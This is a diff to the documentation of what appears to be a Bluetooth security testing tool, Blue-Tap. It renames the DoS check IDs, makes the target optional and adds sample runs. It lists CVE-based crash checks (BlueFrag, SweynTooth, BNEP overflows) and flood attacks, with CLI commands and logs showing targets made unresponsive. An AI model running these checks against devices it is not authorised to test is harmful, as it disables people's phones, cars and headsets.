@@ -31,16 +31,16 @@ Classic Bluetooth DoS checks target the BR/EDR protocol stack --- the traditiona
 
 | Check ID | CVE | Description |
 |----------|-----|-------------|
-| `dos_cve_2017_0781_bnep_heap` | CVE-2017-0781 | BNEP heap overflow via oversized control message |
-| `dos_cve_2017_0782_bnep_underflow` | CVE-2017-0782 | BNEP integer underflow in extension headers |
-| `dos_cve_2022_39177_avdtp_setconf` | CVE-2022-39177 | AVDTP SETCONF heap overflow (malformed codec capabilities) |
-| `dos_cve_2023_27349_avrcp_event` | CVE-2023-27349 | AVRCP event registration out-of-bounds read |
-| `dos_cve_2025_0084_sdp_race` | CVE-2025-0084 | SDP service search race condition |
-| `dos_cve_2025_48593_hfp_reconnect` | CVE-2025-48593 | HFP reconnect-during-teardown crash |
-| `dos_l2ping_flood` | --- | L2CAP echo request flood |
-| `dos_pair_flood` | --- | Rapid pairing request flood |
-| `dos_name_flood` | --- | Remote name request flood |
-| `dos_rate_test` | --- | Connection rate stress test |
+| `cve_2017_0781_bnep_heap` | CVE-2017-0781 | BNEP heap overflow via oversized control message |
+| `cve_2017_0782_bnep_underflow` | CVE-2017-0782 | BNEP integer underflow in extension headers |
+| `cve_2022_39177_avdtp_setconf` | CVE-2022-39177 | AVDTP SETCONF heap overflow (malformed codec capabilities) |
+| `cve_2023_27349_avrcp_event` | CVE-2023-27349 | AVRCP event registration out-of-bounds read |
+| `cve_2025_0084_sdp_race` | CVE-2025-0084 | SDP service search race condition |
+| `cve_2025_48593_hfp_reconnect` | CVE-2025-48593 | HFP reconnect-during-teardown crash |
+| `l2ping_flood` | --- | L2CAP echo request flood |
+| `pair_flood` | --- | Rapid pairing request flood |
+| `name_flood` | --- | Remote name request flood |
+| `rate_test` | --- | Connection rate stress test |
 
 **What these target at the protocol level:**
 
@@ -57,8 +57,8 @@ BLE (Bluetooth Low Energy) DoS checks target the GATT/ATT and SMP layers used by
 
 | Check ID | CVE | Description |
 |----------|-----|-------------|
-| `dos_cve_2019_19192_att_deadlock` | CVE-2019-19192 | ATT deadlock via malformed indication |
-| `dos_cve_2019_19196_key_size` | CVE-2019-19196 | SMP key size overflow |
+| `cve_2019_19192_att_deadlock` | CVE-2019-19192 | ATT deadlock via malformed indication |
+| `cve_2019_19196_key_size` | CVE-2019-19196 | SMP key size overflow |
 
 - **ATT deadlock (CVE-2019-19192):** Part of the SweynTooth family. Sends a malformed ATT Handle Value Indication that triggers a deadlock in the target's ATT state machine. The target stops processing all BLE traffic until rebooted.
 - **SMP key size overflow (CVE-2019-19196):** Also SweynTooth. Sends an SMP Pairing Request with a key size field that exceeds the valid range (>16 bytes), causing a buffer overflow in the key generation routine.
@@ -67,7 +67,7 @@ BLE (Bluetooth Low Energy) DoS checks target the GATT/ATT and SMP layers used by
 
 | Check ID | CVE | Description |
 |----------|-----|-------------|
-| `dos_cve_2020_0022_bluefrag` | CVE-2020-0022 | BlueFrag --- ACL fragment reassembly crash |
+| `cve_2020_0022_bluefrag` | CVE-2020-0022 | BlueFrag --- ACL fragment reassembly crash |
 
 **BlueFrag** is one of the most impactful Bluetooth vulnerabilities discovered. It exploits the ACL fragment reassembly logic in Android's Bluetooth stack. By sending carefully crafted ACL fragments whose sizes cause an integer overflow in the reassembly buffer calculation, the attacker triggers either a crash (DoS) or, on Android 8.0--9.0, remote code execution.
 
@@ -80,22 +80,22 @@ Protocol-level DoS checks stress-test specific protocol behaviors without target
 
 | Check ID | Description |
 |----------|-------------|
-| `dos_hfp_at_flood` | AT command flood over HFP |
-| `dos_hfp_slc_confuse` | Service Level Connection renegotiation loop |
-| `dos_l2cap_cid_exhaust` | Exhaust available L2CAP channel IDs |
-| `dos_l2cap_data_flood` | L2CAP data frame flood |
-| `dos_l2cap_storm` | Combined L2CAP signaling + data flood |
-| `dos_lmp_detach_flood` | LMP detach request flood |
-| `dos_lmp_encryption_toggle` | LMP encryption setup/teardown toggle |
-| `dos_lmp_features_flood` | LMP features request flood |
-| `dos_lmp_invalid_opcode` | Invalid LMP opcode injection |
-| `dos_lmp_switch_storm` | LMP role switch request storm |
-| `dos_lmp_timing_flood` | LMP timing accuracy request flood |
-| `dos_obex_connect_flood` | OBEX connect request flood |
-| `dos_rfcomm_mux_flood` | RFCOMM multiplexer command flood |
-| `dos_rfcomm_sabm_flood` | RFCOMM SABM (connection) frame flood |
-| `dos_sdp_continuation` | SDP continuation state exhaustion |
-| `dos_sdp_des_bomb` | Deeply nested SDP Data Element Sequence |
+| `hfp_at_flood` | AT command flood over HFP |
+| `hfp_slc_confuse` | Service Level Connection renegotiation loop |
+| `l2cap_cid_exhaust` | Exhaust available L2CAP channel IDs |
+| `l2cap_data_flood` | L2CAP data frame flood |
+| `l2cap_storm` | Combined L2CAP signaling + data flood |
+| `lmp_detach_flood` | LMP detach request flood |
+| `lmp_encryption_toggle` | LMP encryption setup/teardown toggle |
+| `lmp_features_flood` | LMP features request flood |
+| `lmp_invalid_opcode` | Invalid LMP opcode injection |
+| `lmp_switch_storm` | LMP role switch request storm |
+| `lmp_timing_flood` | LMP timing accuracy request flood |
+| `obex_connect_flood` | OBEX connect request flood |
+| `rfcomm_mux_flood` | RFCOMM multiplexer command flood |
+| `rfcomm_sabm_flood` | RFCOMM SABM (connection) frame flood |
+| `sdp_continuation` | SDP continuation state exhaustion |
+| `sdp_des_bomb` | Deeply nested SDP Data Element Sequence |
 
 **What these target:**
 
@@ -105,7 +105,7 @@ Protocol-level DoS checks stress-test specific protocol behaviors without target
 - **Parser stress (DES bomb, invalid opcode):** The `sdp_des_bomb` sends deeply nested Data Element Sequences (DES within DES within DES), testing for stack overflow in recursive parsers. `lmp_invalid_opcode` sends LMP packets with reserved/undefined opcodes to test error handling.
 
 !!! note "LMP Checks"
-    The 6 LMP checks (`dos_lmp_*`) require DarkFirmware-patched firmware. LMP operates below the HCI boundary and cannot be accessed through standard Bluetooth APIs.
+    The 6 LMP checks (`lmp_*`) require DarkFirmware-patched firmware. LMP operates below the HCI boundary and cannot be accessed through standard Bluetooth APIs.
 
 ---
 
@@ -146,34 +146,86 @@ After each check completes, the runner probes the target to determine its state.
 
 ## CLI Usage
 
+!!! note "Target is optional"
+    The target address can be omitted. When no target is provided, Blue-Tap scans for nearby devices and presents an interactive picker.
+
 ### Run all applicable DoS checks
 
 ```bash
-blue-tap dos TARGET
+blue-tap dos [TARGET]
 ```
+
+??? example "Example output"
+
+    ```
+    $ sudo blue-tap dos 4C:4F:EE:17:3A:89 --yes
+
+    15:50:00  ●  Running: DoS Check Runner
+    15:50:00  ●  Starting exploitation.dos_runner
+    15:50:00  ●  Running 30 DoS checks against 4C:4F:EE:17:3A:89
+
+    ────────── DoS Check 1/30: l2ping_flood ──────────
+      15:50:01  ●  Sending 500 L2CAP echo requests (1000-byte payload)...
+      15:50:06  ✔  Target responsive after flood (latency +8ms)
+      15:50:06  ✔  Result: recovered
+
+    ────────── DoS Check 4/30: cve_2017_0781_bnep_heap ──────────
+      15:50:15  ●  Sending oversized BNEP SETUP_CONNECTION_REQ...
+      15:50:18  ⚠  Target unresponsive after 3 packets
+      15:50:28  ●  Waiting for recovery (10s)...
+      15:50:38  ✔  Target recovered after 20s
+      15:50:38  ✔  Result: recovered (20s downtime)
+
+    ────────── DoS Check 12/30: sdp_des_bomb ──────────
+      15:51:02  ●  Flooding SDP ServiceSearchReq (1000 requests)...
+      15:51:08  ✔  Target responsive (latency +45ms, degraded)
+      15:51:08  ✔  Result: degraded
+
+    ────────── DoS Check 22/30: pair_flood ──────────
+      15:51:45  ●  Sending rapid pairing requests (100 attempts)...
+      15:51:52  ⚠  Target stopped responding at attempt 67
+      15:52:02  ⚠  Target did not recover within 30s timeout
+      15:52:02  ✖  Result: unresponsive (permanent DoS — power cycle required)
+
+    ╭─ DoS Check Results ──────────────────────────────────────────────────────╮
+    │ Status          Check                                Count              │
+    │ ✔ recovered     L2CAP ping flood, BNEP heap, ...     24                 │
+    │ ⚠ degraded      SDP flood, RFCOMM flood              3                  │
+    │ ✖ unresponsive  Pair flood, ACL fragment flood        2                  │
+    │ ○ skipped       (requires BLE)                        1                  │
+    ╰──────────────────────────────────────────────────────────────────────────╯
+    DoS Summary
+    ──────────────────────────────────────────────────
+      Target              4C:4F:EE:17:3A:89
+      Checks run          29/30
+      Recovered           24
+      Degraded            3
+      Unresponsive        2  (permanent DoS)
+      Skipped             1
+    ```
 
 ### Run specific checks
 
 ```bash
-blue-tap dos TARGET --checks dos_l2ping_flood,dos_pair_flood
+blue-tap dos [TARGET] --checks l2ping_flood,pair_flood
 ```
 
 ### Custom recovery timeout
 
 ```bash
-blue-tap dos TARGET --recovery-timeout 30
+blue-tap dos [TARGET] --recovery-timeout 30
 ```
 
 ### Non-interactive (skip confirmation)
 
 ```bash
-blue-tap dos TARGET --yes
+blue-tap dos [TARGET] --yes
 ```
 
 ### Example output
 
 ```
-$ blue-tap dos AA:BB:CC:DD:EE:FF --checks dos_l2ping_flood,dos_sdp_des_bomb,dos_cve_2022_39177_avdtp_setconf --recovery-timeout 20
+$ blue-tap dos AA:BB:CC:DD:EE:FF --checks l2ping_flood,sdp_des_bomb,cve_2022_39177_avdtp_setconf --recovery-timeout 20
 
 [16:00:01] DoS module starting
 [16:00:01] Target: AA:BB:CC:DD:EE:FF
@@ -183,7 +235,7 @@ $ blue-tap dos AA:BB:CC:DD:EE:FF --checks dos_l2ping_flood,dos_sdp_des_bomb,dos_
 ⚠  These checks are INTRUSIVE. The target may crash or become
    unresponsive. Proceed? [y/N] y
 
-─── Check 1/3: dos_l2ping_flood ──────────────────────────
+─── Check 1/3: l2ping_flood ──────────────────────────
 [16:00:05] Sending L2CAP echo requests (1000 packets, 600B each)...
 [16:00:12] Flood complete. 1000 packets sent in 7.1s (140 pkt/s)
 [16:00:12] Probing recovery...
@@ -191,7 +243,7 @@ $ blue-tap dos AA:BB:CC:DD:EE:FF --checks dos_l2ping_flood,dos_sdp_des_bomb,dos_
 [16:00:13] Remote name: "MyCarAudio" in 45ms
 [16:00:13] Result: SUCCESS (target remained responsive)
 
-─── Check 2/3: dos_sdp_des_bomb ──────────────────────────
+─── Check 2/3: sdp_des_bomb ──────────────────────────
 [16:00:15] Sending nested DES payload (depth: 256, 2048 bytes)...
 [16:00:15] Response: timeout after 10s
 [16:00:15] Probing recovery...
@@ -200,7 +252,7 @@ $ blue-tap dos AA:BB:CC:DD:EE:FF --checks dos_l2ping_flood,dos_sdp_des_bomb,dos_
 [16:00:25] L2CAP echo: response in 12ms
 [16:00:25] Result: RECOVERED (unresponsive for 10.2s, then recovered)
 
-─── Check 3/3: dos_cve_2022_39177_avdtp_setconf ─────────
+─── Check 3/3: cve_2022_39177_avdtp_setconf ─────────
 [16:00:27] Sending malformed AVDTP SETCONF (oversized codec caps)...
 [16:00:27] Connection dropped.
 [16:00:27] Probing recovery...
@@ -215,9 +267,9 @@ $ blue-tap dos AA:BB:CC:DD:EE:FF --checks dos_l2ping_flood,dos_sdp_des_bomb,dos_
 ═══════════════════════════════════════════════════════════
   Target:        AA:BB:CC:DD:EE:FF
   Checks run:    3
-  SUCCESS:       1 (dos_l2ping_flood)
-  RECOVERED:     1 (dos_sdp_des_bomb --- 10.2s recovery)
-  UNRESPONSIVE:  1 (dos_cve_2022_39177_avdtp_setconf)
+  SUCCESS:       1 (l2ping_flood)
+  RECOVERED:     1 (sdp_des_bomb --- 10.2s recovery)
+  UNRESPONSIVE:  1 (cve_2022_39177_avdtp_setconf)
   NOT_APPLICABLE: 0
 ═══════════════════════════════════════════════════════════
 ```
